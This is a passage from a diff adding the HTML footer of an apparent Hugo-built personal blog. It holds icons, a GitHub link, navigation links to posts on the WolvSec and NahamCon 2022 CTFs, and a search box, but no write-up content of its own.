+          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M207.8 20.73c-93.45 18.32-168.7 93.66-187 187.1c-27.64 140.9 68.65 266.2 199.1 285.1c19.01 2.888 36.17-12.26 36.17-31.49l.0001-.6631c0-15.74-11.44-28.88-26.84-31.24c-84.35-12.98-149.2-86.13-149.2-174.2c0-102.9 88.61-185.5 193.4-175.4c91.54 8.869 158.6 91.25 158.6 183.2l0 16.16c0 22.09-17.94 40.05-40 40.05s-40.01-17.96-40.01-40.05v-120.1c0-8.847-7.161-16.02-16.01-16.02l-31.98 .0036c-7.299 0-13.2 4.992-15.12 11.68c-24.85-12.15-54.24-16.38-86.06-5.106c-38.75 13.73-68.12 48.91-73.72 89.64c-9.483 69.01 43.81 128 110.9 128c26.44 0 50.43-9.544 69.59-24.88c24 31.3 65.23 48.69 109.4 37.49C465.2 369.3 496 324.1 495.1 277.2V256.3C495.1 107.1 361.2-9.332 207.8 20.73zM239.1 304.3c-26.47 0-48-21.56-48-48.05s21.53-48.05 48-48.05s48 21.56 48 48.05S266.5 304.3 239.1 304.3z"/></svg>
+</span></a
+        >
+      
+    
+      
+        <a
+          class="px-1 transition-transform hover:scale-125 hover:text-primary-700 dark:hover:text-primary-400"
+          style="will-change:transform;"
+          href="https://github.com/dreeSec"
+          target="_blank"
+          aria-label="Github"
+          rel="me noopener noreferrer"
+          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+</span></a
+        >
+      
+    
+  </div>
+
+</div>
+    </div>
+  </div>
+
+
+      
+
+      
+  
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
+      <div class="flex justify-between pt-3">
+        <span>
+          
+            <a class="group flex" href="/posts/wolvsec-ctf-2022/">
+              <span
+                class="me-2 text-neutral-700 transition-transform group-hover:-translate-x-[2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"
+                ><span class="ltr:inline rtl:hidden">&larr;</span
+                ><span class="ltr:hidden rtl:inline">&rarr;</span></span
+              >
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >WolvSec CTF 2022</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2022-03-29 00:00:00 &#43;0000 UTC">29 March 2022</time>
+                  
+                </span>
+              </span>
+            </a>
+          
+        </span>
+        <span>
+          
+            <a class="group flex text-right" href="/posts/nahamcon-ctf-2022/">
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >Nahamcon CTF 2022</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2022-05-01 00:00:00 &#43;0000 UTC">1 May 2022</time>
+                  
+                </span>
+              </span>
+              <span
+                class="ms-2 text-neutral-700 transition-transform group-hover:-translate-x-[-2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"
+                ><span class="ltr:inline rtl:hidden">&rarr;</span
+                ><span class="ltr:hidden rtl:inline">&larr;</span></span
+              >
+            </a>
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+      
+    </footer>
+  </article>
+
+      </main>
+      
+        <div
+          class="pointer-events-none absolute bottom-0 end-0 top-[100vh] w-12"
+          id="to-top"
+          hidden="true"
+        >
+          <a
+            href="#the-top"
+            class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 backdrop-blur hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+            aria-label="Scroll to top"
+            title="Scroll to top"
+          >
+            &uarr;
+          </a>
+        </div>
+      <footer class="py-10 print:hidden">
+  
+  
+  <div class="flex items-center justify-between">
+    <div>
+      
+      
+        <p class="text-sm text-neutral-500 dark:text-neutral-400">
+            &copy;
+            2025
+            dree
+        </p>
+      
+      
+      
+        <p class="text-xs text-neutral-500 dark:text-neutral-400">
+          
+          
+          Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+            href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href="https://github.com/jpanther/congo" target="_blank" rel="noopener noreferrer">Congo</a>
+        </p>
+      
+    </div>
+    <div class="flex flex-row items-center">
+      
+      
+      
+      
+        <div
+          class="me-14 cursor-pointer text-sm text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+        >
+          <button id="appearance-switcher-0" type="button" aria-label="appearance switcher">
+            <div
+              class="flex h-12 w-12 items-center justify-center dark:hidden"
+              title="Switch to dark appearance"
+            >
+              <span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+</span>
+            </div>
+            <div
+              class="hidden h-12 w-12 items-center justify-center dark:flex"
+              title="Switch to light appearance"
+            >
+              <span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+</span>
+            </div>
+          </button>
+        </div>
+      
+    </div>
+  </div>
+  
+  
+</footer>
+<div
+  id="search-wrapper"
+  class="invisible fixed inset-0 z-50 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh]"
+  data-url="http://localhost:1313/"
+>
+  <div
+    id="search-modal"
+    class="top-20 mx-auto flex min-h-0 w-full max-w-3xl flex-col rounded-md border border-neutral-200 bg-neutral shadow-lg dark:border-neutral-700 dark:bg-neutral-800"
+  >
+    <header class="relative z-10 flex flex-none items-center justify-between px-2">
+      <form class="flex min-w-0 flex-auto items-center">
+        <div class="flex h-8 w-8 items-center justify-center text-neutral-400">
+          <span class="icon relative inline-block px-1 align-text-bottom"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span>
+        </div>
+        <input
+          type="search"
+          id="search-query"
+          class="mx-1 flex h-12 flex-auto appearance-none bg-transparent focus:outline-dotted focus:outline-2 focus:outline-transparent"
+          placeholder="Search"
+          tabindex="0"
+        />
+      </form>
+      <button
+        id="close-search-button"
+        class="flex h-8 w-8 items-center justify-center text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+        title="Close (Esc)"
+      >
+        <span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+</span>
+      </button>
+    </header>
+    <section class="flex-auto overflow-auto px-2">
+      <ul id="search-results">
+        
+      </ul>
+    </section>
+  </div>
+</div>
+
+    </div>
+  </body>
+</html>
